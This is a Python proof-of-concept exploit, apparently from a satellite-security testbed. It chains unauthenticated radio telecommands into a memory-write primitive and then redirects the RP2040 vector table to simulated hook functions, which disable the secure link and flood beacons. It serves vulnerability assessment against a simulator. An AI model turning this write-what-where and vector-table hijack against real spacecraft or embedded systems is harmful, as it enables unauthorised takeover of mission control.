#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-14  MEMCPY TC (src/dst/len attacker-controlled) -> write-what-where
# primitive. Redirect the Cortex-M0+ vector table (VTOR) at a lab hook
# function = remote code execution on the RP2040 mission loop.
# SPARTA: EX-0001 / code execution
def main(dev, ev):
    def memcpy(src, dst, ln):
        return dev.tc(0x18, struct.pack("<IIH", src, dst, ln), via="radio")

    # stage 1: put the target function address into a readable buffer
    addr = fs.SYMBOLS["labFnSecureLinkOff"]           # 0x10012740
    dev.tc(0x1A, addr.to_bytes(4, "little") + b"\x00" * 28, via="radio")
    # stage 2: copy 4 bytes onto SCB_VTOR -> device 'branches' to the hook
    r = dev.find(memcpy(fs.SYM_LOG_NAME, fs.ADDR_VTOR, 4), 0x18)[0]
    ev.log(f"MEMCPY log_name->{fs.ADDR_VTOR:#x} ack={r.payload[:12].hex()}")
    check(r.payload[4:8] == b"RCE\x00" or b"RCE" in r.payload,
          "RCE confirmation marker echoed")
    check(dev.sim.secure is False, "hook effect: secure link executed OFF")
    vt = dev.find(dev.tc(0x19, struct.pack("<IH", fs.ADDR_VTOR, 4),
                         via="radio"), 0x19)[0]
    ev.log(f"VTOR now 0x{vt.le32(7):08X} == labFnSecureLinkOff")
    check(vt.le32(7) == addr, "vector table redirected")

    # second hook: beacon flood function
    addr2 = fs.SYMBOLS["labFnBeaconFlood"]
    dev.tc(0x1A, addr2.to_bytes(4, "little") + b"\x00" * 28, via="radio")
    r = memcpy(fs.SYM_LOG_NAME, fs.ADDR_VTOR, 4)
    dev.advance(1200)
    flood = dev.find(dev.advance(1000), 0x01)
    ev.log(f"after second hook: {len(flood)} beacons in 1 s -> flood hook ran")
    check(len(flood) >= 5, "arbitrary mission function executed")
    ev.log("=> 2 unauthenticated TCs = arbitrary mission-code execution")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-14 MEMCPY primitive -> RP2040 RCE", main))
